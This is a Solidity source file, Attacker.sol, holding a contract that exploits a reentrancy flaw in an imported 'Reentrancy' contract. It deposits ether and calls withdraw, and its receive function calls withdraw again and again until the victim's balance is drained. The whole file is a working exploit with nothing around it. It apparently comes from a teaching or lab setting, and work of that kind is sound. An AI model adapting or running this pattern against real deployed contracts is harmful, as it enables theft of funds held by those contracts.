// Attacker.sol
pragma solidity ^0.8.0;

import "./Reentrancy.sol";

contract Attacker {
    Reentrancy private immutable victim;

    constructor(Reentrancy _victim) {
        victim = _victim;
    }

    function attack() external payable {
        victim.deposit{value: msg.value}();
        victim.withdraw();
    }

    receive() external payable {
        if (address(victim).balance > 0) {
            victim.withdraw();
        }
    }
}
